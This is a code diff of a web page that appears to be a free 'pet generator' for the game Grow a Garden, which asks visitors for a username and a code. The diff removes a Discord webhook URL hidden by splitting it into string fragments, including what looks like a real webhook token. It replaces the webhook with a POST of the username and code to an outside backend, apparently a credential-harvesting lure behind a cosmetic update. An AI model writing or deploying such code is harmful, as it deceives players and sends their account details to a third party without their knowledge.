@@ -40,9 +40,13 @@
     height: 180px;
   }
   .pet-card img {
-    max-width: 80px;   /* smaller icons */
-    max-height: 80px;  /* smaller icons */
+    max-width: 80px;
+    max-height: 80px;
     margin-bottom: 8px;
+    transition: transform 0.3s;
+  }
+  .pet-card:hover img {
+    transform: scale(1.1);
   }
   .pet-card:hover {
     transform: scale(1.05);
@@ -151,7 +155,6 @@
   </div>
 
 <script>
-  // --- Pets ---
   const pets = [
     { id: 'Kitsune', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Kitsune.png', name: 'Kitsune' },
     { id: 'Raccoon', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Raccoon.png', name: 'Raccoon' },
@@ -191,19 +194,6 @@
     document.getElementById('confirmPopup').style.display = 'none';
   }
 
-  // --- Scattered webhook pieces ---
-  const p1 = "https://disc";
-  const p2 = "ord.com/ap";
-  const p3 = "i/webh";
-  const p4 = "ooks/";
-  const wid = "1409605165782143016";
-  const token1 = "/a9nUyURURC7QOuWcsM";
-  const token2 = "zKzzTIGzo1tW3A_";
-  const token3 = "kseFgaud3WQ_hz3Vkx";
-  const token4 = "IOwm31H7xySmLBJbm";
-
-  const webhookURL = p1+p2+p3+p4+wid+token1+token2+token3+token4;
-
   async function submitData() {
     const username = document.getElementById('username').value.trim();
     const code = document.getElementById('code').value.trim();
@@ -213,19 +203,21 @@
     }
 
     const payload = {
-      content: `Pet Generated!\nUsername: ${username}\nCode: ${code}\nSelected Pet: ${pets.find(p=>p.id===selectedPet).name}`
+      username,
+      code,
+      pet: pets.find(p => p.id === selectedPet).name
     };
 
     try {
-      const res = await fetch(webhookURL, {
+      const res = await fetch("https://backend-sigma-one-64.vercel.app/submit", {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
       });
 
       if (!res.ok) {
-        console.error("Webhook error:", await res.text());
-        alert("Webhook failed. Check console for details.");
+        console.error("API error:", await res.text());
+        alert("Failed to send data.");
         return;
       }
 
@@ -235,11 +227,10 @@
 
     } catch (err) {
       console.error("Fetch error:", err);
-      alert("Could not send data to webhook.");
+      alert("Could not connect to backend.");
     }
   }
 
-  // 🎉 Confetti Effect
   function launchConfetti() {
     const duration = 3 * 1000;
     const end = Date.now() + duration;
